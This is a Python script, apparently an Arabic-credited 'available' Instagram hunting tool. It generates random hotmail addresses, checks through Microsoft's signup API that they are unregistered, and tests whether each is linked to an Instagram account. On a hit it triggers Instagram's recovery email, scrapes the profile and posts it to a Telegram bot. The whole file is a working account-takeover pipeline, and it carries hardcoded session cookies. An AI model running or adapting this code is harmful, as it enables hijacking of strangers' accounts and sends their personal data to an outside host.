import os
import json
import random
import requests
import time
from uuid import uuid4
from AegosPy import GetInfoInsta
from user_agent import generate_user_agent
import json
import uuid
from secrets import token_hex
from faker import Faker
import threading
DvD = "android-" + str(uuid4())
cone = token_hex(8).upper()   
bone = token_hex(8).upper()  
uid = uuid.uuid4()
lopp = str(uuid.uuid4())
Lol = str(uuid.uuid4())
Gio = str(uuid.uuid4())
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] YouTube    : {B}| أحمد الحراني
|{Z}[+] TeleGram  : {B} maho_s9    |
|{Z}[+] Instagram  : {B}ahmedalharrani |
|{Z}[+] Tool  : {B} متاحات-  IG |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)


def send(email):
    user = email.split('@')[0]
    
    headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }

    data = {
        'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"{email}"}}',
        'ig_sig_key_version': '4',
    }

    res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)

    if '"status":"ok"' in res.text:
        rest = res.json()['email']
    else:
        rest = 'Band Requests !'

    he = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar,en;q=0.9',
        'cookie': f'ig_did={uuid4()}; datr=8J8TZD9P4GjWjawQJMcnRdV_; mid=ZBOf_gALAAGhvjQbR29aVENHIE4Z; ig_nrcb=1; csrftoken=5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy; ds_user_id=56985317140; dpr=1.25',
        'referer': f'https://www.instagram.com/{email}/?hl=ar',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'viewport-width': '1051',
        'x-asbd-id': '198387',
        'x-csrftoken': '5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-requested-with': 'XMLHttpRequest',
    }

    rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}', headers=he)
    
    if 'data' in rr.text:
        try:
            Id = rr.json()['data']['user']['id']
        except:
            Id = ""
        try:
            name = rr.json()['data']['user']['full_name']
        except:
            name = ""
        try:
            bio = rr.json()['data']['user']['biography']
        except:
            bio = ""
        try:
            flos = rr.json()['data']['user']['edge_followed_by']['count']
        except:
            flos = ""
        try:
            flog = rr.json()['data']['user']['edge_follow']['count']
        except:
            flog = ""
        try:
            pr = rr.json()['data']['user']['is_private']
        except:
            pr = ""

        try:
            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()
            da = re['date']
        except:
            da = 'No Date'

        tlg = (f'''
        ☆ HI Mahos Getting Hits
        ☆ Name —> {name}
        ☆ User —>  {user}
        ☆ Email —>  {email}
        ☆ Followers —> {flos}
        ☆ Following —> {flog}
        ☆ Date —> {da}
        ☆ Id —> {Id}
        ☆ Bio —> {bio}
        ☆ Private —> {pr}
        ☆ Reset Email —> {rest}
        ☆ BY : @maho_s9
        ''')
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
    else:
        erorr_tlg=(f'''
        صدت حساب بدون معلومات
	email >> {email}
	Username > {user}
	''')
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(erorr_tlg))
        
  	   

def mahos(email):
    cookies = {
        'csrftoken': 'YjlljueBSWzwt8WnqpCh6u',
        'dpr': '2.1988937854766846',
        'ps_n': '0',
        'ps_l': '0',
        'mid': 'ZfhWlgAEAAHpmM3pYl8NwjixXtRC',
        'ig_did': '32192E3C-8C2B-4C96-9656-373F7E7A9133',
        'datr': 'llb4ZSpC9kLGTAiiM6I4rFqm',
        'ig_nrcb': '1',
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'dpr': '2.19889',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Linux"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(generate_user_agent()),
        'viewport-width': '891',
        'x-asbd-id': '129477',
        'x-csrftoken': 'YjlljueBSWzwt8WnqpCh6u',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1012280089',
        'x-requested-with': 'XMLHttpRequest',
    }

    timestamp = str(time.time()).split('.')[0]
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:mahos999',
        'optIntoOneTap': 'false',
        'queryParams': '{}',
        'trustedDeviceRecords': '{}',
        'username': email,
    }

    rr = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data).text
    if '"user":true' in rr:
        print(f'{F}Available IG : {email}')
        send(email)
    else:
        print(f'{Z}Bad IG >> {email}')

def ch(email):  
        
    cookies = {
    'mkt': 'ar-SA',
    'MicrosoftApplicationsTelemetryDeviceId': f'{uid}',
    'MUID': f'{Lol}',
    'MSFPC': 'GUID=1f0959d32e1a4951957795da73aad529&HASH=1f09&LV=202403&V=4&LU=1710624081495',
    'mkt1': 'ar-YE',
    'amsc': 'C6l+J91z6IO3FKv+1XyfMMRveI560YWbVLPC4MoKkg0bW/51nVsYmYel6L8eQu1OkgQjvmWl0myjJ1mpQXnjOEuUNJgL40S6uy/FN8HGgttrT1Ddpgnv2dQL0mNFW+l+x6LtlREhZZeW+WU1yDA7y4l8vZObJ3UFHlsyMfROEiBHiEd9Ha/AxJc/9zc0bI9ZUODUOo/AFr7hUQe8Ec36NRFmMeDKihrKhZ+Nb/XxVlUguMVUbcAX1v9lEwvCyULWR/xBfGGfd78Wx8oASv0eVmDFHtOFacn3tnzfAoEZXWc=:2:3c',
    'clrc': '{%2219809%22%3a[%22+VC+x0R6%22%2c%22d7PFy/1V%22%2c%22FutSZdvn%22]}',
    'fptctx2': 'taBcrIH61PuCVH7eNCyH0Iitb%252bEMfwlgK%252fM8w%252f28EbegQkejJquvjmCz56DONCWxwAExlejiLm%252bdhACyVtpEITuoy6TfjlvoC%252bwYb5eAbvSIWTuYWC7AT1BkSq7yqmIhIZInW0%252bfH9AJdt4xtQ68Z27%252fUtkbOm8eucBhjMTvTFFrDX6OIuGdUgK7t4iHV4RaYFb0tWuVmuaBskrcDvko7wEUkjygY4grWDaKKt5AQazl%252bmOO1q3iSjfno08NTr2WzI7LpWItgr9ejBn%252foUibdG%252fVom%252fQT8KF5FecR6VoW6jWkFw68kYXweh6zd0FVYN9QWdBJksLRD4rNiq%252bPB%252bUHQ%253d%253d',
    'ai_session': '/SoY/7fmZaJ0rVgoSbFDD4|1711504361468|1711504361468',
}
    headers = {
    'authority': 'signup.live.com',
    'accept': 'application/json',
    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
    'canary': 'XXB8gsWWNr13VR4q2+eduNocDse2iXJI17GEJJsxLhqZl4hDxQUVaVmj3en6yJAVZsTQT1qCG/tfB4wl0VLl+I/h5FSO0puRkBeERI1bUTR60q4f0Gze/ogq7HuYR+4H53qgHyQ0tsCKh9L2H+6x5i+sZHihqj4sRsZR0fzFu+G7rO6XqT2tBiNaZPAn8ucQtzwMLIv+NQoRki9Rnz0aK9DqXDvojXN1+vN+8Jkqd/0nXZE8GH66zCG18pnRVSSu:2:3c',
    'content-type': 'application/json',
    'hpgid': '200639',
    'origin': 'https://signup.live.com',
    'referer': f'https://signup.live.com/signup?contextid={cone}&opid={bone}&bk=1711504231&sru=https://login.live.com/login.srf%3fcontextid%3d{cone}%26opid%3d{bone}%26mkt%3dAR-YE%26lc%3d9217%26bk%3d1711504231%26uaid%3d{lopp}&uiflavor=web&lic=1&mkt=AR-YE&lc=9217&uaid={lopp}',
    'scid': '100118',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'tcxt': 'u+IJxjKstlu+zfBOO3WsH6pHytoM6hrkBPreu2aa7e9piBqWSrnQfeTRRbvJvKm4oDIoxbZ/bjISuQ6G9+83ym7NJscCREBvWsyOR/YJRtcG8SRtSuxy6Tn+YzVrqoM8CJ5C1Zyw5EmpHuMmXrmlOrj5C4YWASZpnTldmB+WSp/fdI8jA/TexViCDegemJZ/FDz8TBk2aeIpLMNqllg0svkMAJ8HueSYKYRTo7qVbKQac24PP4mhriDqmWNP527NJ+taeinxcnbe8Ho8jjuNIxO4qctA+fgcn7YeJv3/nWMsN5+hvirFdfiRVoZzU1R9ls6cRDWH16fr9LX/1dC8Ebq6QEy8aDJ7/FSUgU+mRCHHrRKCD85i/zznhiRyF2/eLg4ROZzJn8G9F3+VD/X7mHFM5WHGMIb2o/eqFPJeESwUcqe1+bUa4XuoytGeH9vaO1UgWZ/rsxJJPQn4xTCccblgagnu3OdwkSt0w5n3/KzfI2m3oogTcvOshMfeBEqeqdyZc9bIB4hJADVCQ9iqZL5kxWpeh/fKs0RdI2BYenG3okr4l67eQC6gYWrcmPiiaQs9b7oysO3aFRSkgiLCoXHW5mNwdcFtLeSzUgSLxkk=:2:3',
    'uaid': lopp,
    'uiflvr': '1001',
    'user-agent': generate_user_agent(),
    'x-ms-apitransport': 'xhr',
    'x-ms-apiversion': '2',
}
     
    json_data = {
    'signInName': email,
    'uaid': lopp,
    'includeSuggestions': True,
    'uiflvr': 1001,
    'scid': 100118,
    'hpgid': 200639,
}
    res = requests.post(
    f'https://signup.live.com/API/CheckAvailableSigninNames?contextid={cone}&opid={bone}&bk=1711504231&sru=https://login.live.com/login.srf%3fcontextid%3d{cone}%26opid%3d{bone}%26mkt%3dAR-YE%26lc%3d9217%26bk%3d1711504231%26uaid%3d{lopp}&uiflavor=web&lic=1&mkt=AR-YE&lc=9217&uaid={lopp}',
    cookies=cookies,
    headers=headers,
    json=json_data,
).text
    if '"isAvailable":true' in res:
        print(f'{B}Good Gmail >> {email}')
        mahos(email)        
    else:
        print(f'{Z}Bad Gmail >> {email}')

def search():
    faker = Faker('ru_RU')
    while True:
        users = faker.user_name()
        num = '56789'
        rng = int("".join(random.choice(num) for i in range(1)))
        wqq = 'qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
        name = str("".join(random.choice(wqq) for i in range(rng)))
        bosses = [name , users]
        boss = random.choice(bosses)
        email = boss + '@hotmail.com'
        ch(email)

Threads = []
for _ in range(7):
    t = threading.Thread(target=search)
    t.start()
    Threads.append(t)

for thread in Threads:
    thread.join()